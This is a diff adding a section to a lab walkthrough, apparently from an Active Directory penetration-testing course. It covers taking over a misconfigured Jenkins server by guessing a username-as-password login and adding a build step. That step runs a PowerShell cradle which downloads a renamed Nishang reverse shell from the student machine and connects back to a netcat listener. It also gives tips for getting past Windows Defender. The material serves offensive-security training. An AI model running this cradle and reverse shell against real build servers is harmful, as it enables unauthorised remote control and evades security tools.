@@ -133,7 +133,42 @@ Invoke-AllChecks
 ```
 Abuse Jenkins Instance
 Next, let's try our hands on the Jenkins instance. To be able to execute commands on Jenkins server without admin access we must have privileges to Configure builds. We have a misconfigured Jenkins instance on dcorp-ci (http://172.16.3.11:8080). If we go to the "People" page of Jenkins we can see the users present on the Jenkins instance. Remember to use Edge to open the Jenkins web console!
+<figure><img src="../assets/jenkins-1.png" alt=""><figcaption></figcaption></figure>
 
+Since Jenkins does not have a password policy many users use username as passwords even on the publicly available instances. By manually trying the usernames as passwords we can identify that the user builduser has password builduser. The user builduser can Configure builds and Add Build Steps which will help us in executing commands.
+
+Use the encodedcomand parameter of PowerShell to use an encoded reverse shell or use download execute cradle in Jenkins build step. You can use any reverse shell, below we are using a slightly modified version of Invoke-PowerShellTcp from Nishang. We renamed the function Invoke-PowerShellTcp to Power in the script to bypass Windows Defender.
+
+If using Invoke-PowerShellTcp, make sure to include the function call in the script Power -Reverse -IPAddress 172.16.100.X -Port 443 or append it at the end of the command in Jenkins. Please note that you may always like to rename the function name to something else to avoid detection.
+
+**NOTE:** Upload Invoke-PowerShellTCP.ps1 script on HFS Server.
+
+```batch
+powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
+```
+<figure><img src="../assets/jenkins-2.png" alt=""><figcaption></figcaption></figure>
+
+#### Save the configuration.
+
+### Double check the following:
+1. Remember to host the reverse shell on a local web server on your student VM. You can find hfs.exe in the C:\AD\Tools directory of your student VM. Note that HFS goes in the system tray when minimized. You may like to click the up arrow on the right side of the taskbar to open the system tray and double-click on the HFS icon to open it again.
+2. Also, make sure to add an exception or turn off the firewall on the student VM.
+3. Check if there is any typo or extra space in the Windows Batch command that you used above in the Jenkins project.
+4. After you build the project below, check the 'Console Output' of the Jenkins Project to know more about the error.
+   
+On the student VM, run a netcat or powercat listener which listens on the port which we used above (443):
+
+```batch
+C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
+```
+
+We can now run commands on the reverse shell:
+
+$env:username
+
+ipconfig
+
+$env:computername
 
 {% endtab %}
 {% endtabs %}
